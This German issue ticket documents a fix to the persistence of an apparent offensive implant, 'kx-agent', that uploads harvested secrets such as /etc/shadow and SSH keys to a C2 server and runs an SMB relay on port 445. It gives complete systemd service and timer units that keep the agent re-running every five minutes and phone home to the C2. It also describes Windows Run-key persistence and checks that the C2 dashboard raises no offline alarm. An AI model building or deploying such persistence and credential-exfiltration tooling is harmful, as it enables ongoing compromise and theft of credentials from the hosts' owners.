---
id: ISSUE-20
title: Der Agent läuft als systemd-Dienst in einer Endlosschleife
status: in-progress
priority: high
---

# ISSUE-20 — Der Agent läuft als systemd-Dienst in einer Endlosschleife

## Description

Im Betrieb auf `rocky` (Kali-VM 192.168.191.142, 2026-11-16) startet der
Agent **alle zwölf Sekunden** neu. `journalctl -u kx-agent` zeigt einen neuen
Lauf nach dem anderen; jeder Lauf meldet 19 Secrets hoch, überschreibt seine
eigene Unit und bindet für 120 Sekunden Port 445.

Das ist kein Unfall, sondern die Folge aus vier Fehlern, die sich gegenseitig
verstecken:

1. **Die Unit startet den Agenten wieder von vorn.** Sie war `Type=simple`
   mit `Restart=always` und `RestartSec=5`. `main()` läuft linear durch und
   endet mit Exit-Code 0 — auch wenn die Selbstregistrierung fehlgeschlagen
   ist. Für systemd ist der Lauf damit ein erfolgreicher Prozess, der
   beendet wurde: das ist genau der Fall, für den `Restart=always` da ist.
   Ergebnis: Neustart alle fünf Sekunden, im Betrieb alle zwölf.
2. **Die Unit wird bei jedem Lauf überschrieben.** `install_systemd_service`
   schreibt die Unit-Datei mit `std::fs::write`, ohne den Bestand zu
   prüfen. Jede Betreiber-Änderung an der Unit ist damit nach zwölf
   Sekunden wieder weg.
3. **Der Agent startet ohne `WorkingDirectory`.** systemd setzt das
   Arbeitsverzeichnis auf `/`. Ein relativer Pfad — das Asset
   `assets/smbrelayx.py` — löst sich dort nicht auf. Im Betrieb lag das
   Asset deshalb als Hack unter `/assets/smbrelayx.py`.
4. **`--relay-script` stand nicht in der Argumentliste der Unit.** Der
   persistierte Agent fiel damit immer auf den Default
   `assets/smbrelayx.py` zurück — und der löst sich gegen das
   Arbeitsverzeichnis auf, nicht gegen das Verzeichnis des Binaries.

Der gewünschte Zustand ist ein **Einmal-Lauf im Takt**: der Agent läuft,
meldet, endet — und der nächste Lauf kommt vom Timer, nicht aus dem
Neustart-Verhalten der Unit.

## Acceptance Criteria

- [x] Die Service-Unit ist `Type=oneshot` und verbietet den Neustart
      (`Restart=no`); `Restart=always` kommt nicht mehr vor.
- [x] Die Unit setzt `WorkingDirectory` auf das Verzeichnis, in dem das
      Binary liegt — ermittelt aus dem Pfad des Binaries, nicht aus dem
      Arbeitsverzeichnis des Prozesses.
- [x] Es gibt eine zweite Unit-Datei `kx-agent.timer` mit `OnBootSec=2min`,
      `OnUnitActiveSec=5min` und `Persistent=true`. Die Service-Unit hängt
      an ihr (`WantedBy=kx-agent.timer`), der Timer nennt sie
      (`Unit=kx-agent.service`).
- [x] Beide Unit-Dateien werden geschrieben — die Service-Unit bleibt
      allein startbar (`systemctl start kx-agent`), der Timer gibt den Takt
      vor.
- [x] Die Argumentliste der Unit enthält `--relay-script` mit dem
      aufgelösten Pfad zum Asset.
- [x] `main()` endet mit Exit-Code 1, wenn die Selbstregistrierung
      fehlschlägt oder wenn kein einziger Secret-Upload geklappt hat. Ein
      Lauf, der nichts erreicht, meldet keinen Erfolg.
- [x] Unit-, Timer- und Environment-Datei werden nur geschrieben, wenn sich
      ihr Inhalt ändert.
- [x] Der Default-Assetpfad wird relativ zum Verzeichnis des Binaries
      aufgelöst (`<binary-dir>/assets/smbrelayx.py`); gibt es das dort nicht,
      bleibt der bisherige relative Wert stehen.
- [x] **Der C2 hat keine Offline-Logik — der Fünf-Minuten-Takt ist
      unkritisch.** Geprüft in `kx-server/src/dashboard.rs` und
      `kx-server/src/db.rs`: das Dashboard zeigt je Host nur
      `ip`, `hostname`, `os` und `status` (`dashboard.rs:58`), und der
      Status kommt aus dem Payload des Agenten. `last_seen` wird in der
      Datenbank gepflegt (`db.rs:193`, `db.rs:227`), aber weder angezeigt
      noch gegen eine Schwelle geprüft; ein Offline-Flag gibt es nicht. Der
      Agent sendet zudem keinen Heartbeat (`POST /api/heartbeat` wird vom
      Agenten nicht benutzt). Ein Lauf alle fünf Minuten verändert die
      Sicht des Operators deshalb nicht.
- [x] Tests decken die neuen Unit-Inhalte ab: `Type=oneshot`, kein
      `Restart=always`, `WorkingDirectory` gesetzt, Timer-Einträge gesetzt.
- [x] `cargo test --workspace` und `cargo fmt --check` sind grün.

## Technical Notes

**Die Unit-Dateien im Wortlaut** (Binary unter `/usr/local/bin`):

```
# /etc/systemd/system/kx-agent.service
[Unit]
Description=Kx persistent agent (kx-agent)
After=network-online.target

[Service]
Type=oneshot
EnvironmentFile=/etc/kx/kx-agent.env
WorkingDirectory=/usr/local/bin
ExecStart=/usr/local/bin/kx-agent --server ${KX_C2_URL} --token ${KX_C2_TOKEN} ...
Restart=no

[Install]
WantedBy=kx-agent.timer

# /etc/systemd/system/kx-agent.timer
[Unit]
Description=Kx persistent agent timer (kx-agent)
After=network-online.target

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Persistent=true
Unit=kx-agent.service

[Install]
WantedBy=timers.target
```

**Warum `Restart=no` statt `Restart=on-failure`.** `main()` endet jetzt mit
einem aussagekräftigen Exit-Code, `on-failure` wäre also möglich. Der Timer
trägt den Takt aber ohnehin; ein Neustart durch systemd würde nur einen
zweiten Taktgeber danebenstellen — und der Agent, der den Fehler beheben
könnte (C2 nicht erreichbar), ist genau der, der gerade nicht läuft. Der
nächste Versuch kommt in fünf Minuten vom Timer.

**Die `WantedBy=`-Kette.** Der Timer zeigt im `[Install]`-Abschnitt auf
`timers.target` — das ist der Übliche: `WantedBy=` nennt die Units, die
*diese* Unit starten sollen. Die Service-Unit hängt umgekehrt am Timer
(`WantedBy=kx-agent.timer`), und der Timer nennt im `[Timer]`-Abschnitt die
Unit, die er startet (`Unit=kx-agent.service`). Damit ist die Kette
vollständig: `timers.target` → `kx-agent.timer` → `kx-agent.service`.

**`systemctl enable kx-agent` aktiviert den Dienst, `systemctl enable --now
kx-agent.timer` den Takt.** `enable` auf dem Dienst legt die Verknüpfung
`kx-agent.timer.wants/kx-agent.service` an — der Timer zieht den Dienst an
sich. Der erste Start des Timers holt den Dienst deshalb **sofort** — der
Agent, der die Persistenz gerade installiert, läuft in diesem Moment noch.
Zwei Agenten gleichzeitig sind möglich; der zweite scheitert am Port 445 und
meldet das als Warnung (`smb_relay.rs` behandelt den Fehlschlag des
Relay-Aufrufs kontrolliert). Nach dem nächsten Lauf ist die Lage sauber:
Timer alle fünf Minuten, ein Agent pro Lauf.

**Betreiber-Änderungen gehören in ein Drop-in.** Der Agent ist der
Eigentümer der Unit-Datei: er schreibt sie, sobald sich der Inhalt ändert.
Eine von Hand geänderte Unit wird beim nächsten Lauf wieder überschrieben
(früher: alle zwölf Sekunden, jetzt: alle fünf Minuten). Der richtige Ort
für Betreiber-Änderungen ist deshalb
`/etc/systemd/system/kx-agent.service.d/override.conf` — ein Drop-in wird
von der Unit-Datei nicht berührt.

**Das Asset im Betrieb.** Der Agent sucht das Relay-Skript zuerst neben
seinem Binary (`<binary-dir>/assets/smbrelayx.py`) und fällt auf den
relativen Wert `assets/smbrelayx.py` zurück, wenn es dort nicht liegt. Für
den Betrieb heißt das: Binary und `assets/` in **ein** Verzeichnis legen,
z. B.

```
/opt/kx/kx-agent
/opt/kx/assets/smbrelayx.py
```

Dann löst sowohl der absolute Pfad in der Unit (`--relay-script
/opt/kx/assets/smbrelayx.py`) als auch das `WorkingDirectory=/opt/kx` den
Assetpfad auf. Der bisherige Hack `/assets/smbrelayx.py` kann damit weg.

**Der Exit-Code.** Exit 1 gibt es bei zwei Fällen: die Selbstregistrierung
ist fehlgeschlagen, oder es gab mindestens ein Secret hochzuladen und **kein
einziges** Upload hat geklappt. Ein Host, auf dem schlicht nichts gefunden
wurde (keine `/etc/shadow`, keine SSH-Keys), ist **kein** Fehlschlag — der
Lauf hat den C2 erreicht und nichts zu melden. Diese Auslegung weicht von
der wörtlichen Vorgabe („kein einziger Secret-Upload geklappt") ab, weil
sonst jeder Host ohne Fund als fehlgeschlagen endete.

**Was am Windows-Pendant anders ist** (`kx-win/src/persist.rs`): Dort wird
über den Run-Key (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`)
persistiert — der Agent startet bei jeder Anmeldung. Es gibt dort weder eine
Unit-Datei noch einen `Restart=`, also auch keine Neustart-Schleife; der
Windows-Agent läuft einmal pro Sitzung. `sc.exe` und `schtasks` liegen im
Crate, werden aber vom Agenten nicht benutzt (der Dienst bricht nach 30
Sekunden mit „FAILED 1053" ab). Das Asset-Problem ist auf Windows
dieselbe — der Run-Key startet mit dem Arbeitsverzeichnis der
Explorer-Sitzung; der jetzt absolute `--relay-script`-Pfad in der Invocation
löst es auch dort. Der Token steht unter Windows im Klartext in der
Prozessliste (`sc.exe` kennt keine Environment-Datei); das ist dokumentiert
und bleibt so.

**Nicht Teil dieses Fixes.** Die Heartbeat-Funktion des C2 (`POST
/api/heartbeat`) wird vom Agenten nicht benutzt, und das Dashboard zeigt
keinen Offline-Zustand. Beides wäre eine eigene Entscheidung — die
Änderung ist für den Fünf-Minuten-Takt aber nicht nötig.

**Related:** ISSUE-16 (ARP-Sweep), ISSUE-19 (SMB-Relay, Port 445)
